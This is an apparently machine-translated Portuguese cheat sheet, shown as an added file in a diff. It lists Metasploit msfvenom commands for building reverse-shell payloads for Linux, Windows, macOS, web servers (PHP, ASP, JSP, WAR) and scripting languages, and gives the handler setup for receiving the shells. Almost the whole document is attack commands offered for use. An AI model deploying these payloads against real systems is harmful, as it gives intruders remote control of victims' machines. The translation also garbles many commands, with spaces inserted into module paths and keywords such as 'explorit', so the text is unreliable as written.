@@ -1,0 +1,98 @@
+Criando Cargas Públicas Metasploit
+
+Peleus
+
+Muitas vezes, uma das habilidades mais úteis (e ao iniciante subestimado) do Metasploit é o módulo msfpayload. 
+Várias cargas úteis podem ser criadas com este módulo e ajuda algo que pode lhe dar um shell em quase qualquer situação. 
+Para cada uma dessas cargas úteis, você pode entrar no msfconsole e selecionar exploit / multi / handler. 
+Execute 'carga útil definida' para a carga útil relevante usada e configure todas as opções necessárias (LHOST, LPORT, etc.). 
+Execute e espere que a carga útil seja executada. Para os exemplos abaixo, é bastante auto-explicativo, 
+mas LHOST deve ser preenchido com seu endereço IP (LAN IP se atacar dentro da rede, WAN IP se atacar através da internet) 
+e LPORT deve ser a porta na qual você deseja estar conectado novamente.
+Lista de cargas úteis
+
+  msfvenom -l 
+
+Binários
+
+Linux
+
+  msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = < Seu endereço IP > LPORT = 
+< Sua porta para conectar-se > -f elf > shell.elf 
+
+janelas
+
+  msfvenom -p windows / meterpreter / reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f exe > shell.exe 
+
+Mac
+
+  msfvenom -p osx / x86 / shell_reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f macho > shell.macho 
+
+Cargas úteis da Web
+
+PHP
+
+ msfvenom -p php / meterpreter_reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f raw > shell.php cat shell.php |  pbcopy && echo '<? php' |  tr -d '\ n' > shell.php && pbpaste >> shell.php 
+
+ASP
+
+  msfvenom -p windows / meterpreter / reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f asp > shell.asp 
+
+JSP
+
+  msfvenom -p java / jsp_shell_reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f raw > shell.jsp 
+
+GUERRA
+
+  msfvenom -p java / jsp_shell_reverse_tcp LHOST = < Seu endereço IP > LPORT = < Your Port to Connect On > -f war > shell.war 
+
+Scripting Payloads
+
+Python
+
+  msfvenom -p cmd / unix / reverse_python LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se > -f raw > shell.py 
+
+Bash
+
+  msfvenom -p cmd / unix / reverse_bash LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se > -f raw > shell.sh 
+
+Perl
+
+  msfvenom -p cmd / unix / reverse_perl LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se > -f raw > shell.pl 
+
+Código Shell
+
+Para todos os shellcode, veja 'msfvenom -help-formats' para obter informações sobre parâmetros validos. 
+O Msfvenom emitirá um código que pode ser copiado e colado neste idioma para suas façanhas.
+
+Código Shell Shell baseado em Linux
+
+  msfvenom -p linux / x86 / meterpreter / reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se >
+ -f < idioma > 
+
+Código Shell Shell baseado no Windows
+
+  msfvenom -p windows / meterpreter / reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se > -f < idioma > 
+
+Código-base baseado em Mac
+
+  msfvenom -p osx / x86 / shell_reverse_tcp LHOST = < Seu endereço IP > LPORT = < Sua porta para conectar-se > -f < idioma > 
+
+Manipuladores
+
+Os manipuladores Metasploit podem ser excelentes ao configurar rapidamente o Metasploit para estar em posição de receber 
+os seus conchas de entrada. Os manipuladores devem estar no seguinte formato.
+
+  use explorit / multi / handler
+ configure PAYLOAD < Nome da carga útil >
+ defina LHOST < LHOST value >
+ defina LPORT < LPORT value >
+ definir ExitOnSession falso
+ explorar -j -z 
+
+Uma vez que os valores necessários são concluídos, o comando a seguir executará o manipulador - "msfconsole -L -r ' 
